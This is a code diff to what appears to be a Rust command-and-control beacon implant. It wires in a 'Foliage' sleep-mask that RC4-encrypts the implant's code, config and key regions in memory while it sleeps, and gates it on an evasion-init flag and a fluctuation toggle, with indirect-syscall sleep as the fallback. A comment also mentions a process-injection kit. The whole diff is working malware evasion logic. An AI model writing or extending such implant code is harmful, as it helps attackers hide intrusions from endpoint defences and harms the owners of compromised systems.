@@ -62,12 +62,22 @@ const SLEEPMASK_KIT: Foliage = Foliage;
 
 /// Beacon-facing sleep entry. Routes through the configured kit so a future
 /// encrypting impl is a one-line kit swap, not a loop edit.
+///
+/// # Fluctuation gating (sleep-mask wiring)
+/// Engages the Foliage fluctuation sleep-mask ONLY when BOTH:
+///   (a) the full evasion init ran (`beacon::evasion_active()`) — so `mem::mask`
+///       has registered the .text/config/key regions the thunk will flip, AND
+///   (b) `fluctuation::enabled()` is true (compile-time `NYX_FLUCTUATION_OFF`
+///       plus the runtime `set_enabled` toggle).
+/// Otherwise falls through to the plain indirect-syscall sleep. This closes
+/// the historical "crashes in noevasion mode" failure: the crash was the thunk
+/// trying to unmask regions that `mem::mask()` never registered.
 pub fn sleep(seconds: u32) {
-    // Use beacon::sleep_seconds (NtWaitForSingleObject/NtDelayExecution via
-    // indirect syscall or direct PEB-resolved export). Avoids the Foliage
-    // fluctuation sleep-mask which RC4-encrypts .text during sleep — that
-    // crashes in noevasion mode where the masking init was skipped.
-    crate::beacon::sleep_seconds(seconds);
+    if crate::beacon::evasion_active() && crate::fluctuation::enabled() {
+        SLEEPMASK_KIT.sleep_masked(seconds);
+    } else {
+        crate::beacon::sleep_seconds(seconds);
+    }
 }
 
 // ---- Process-inject kit --------------------------------------------------
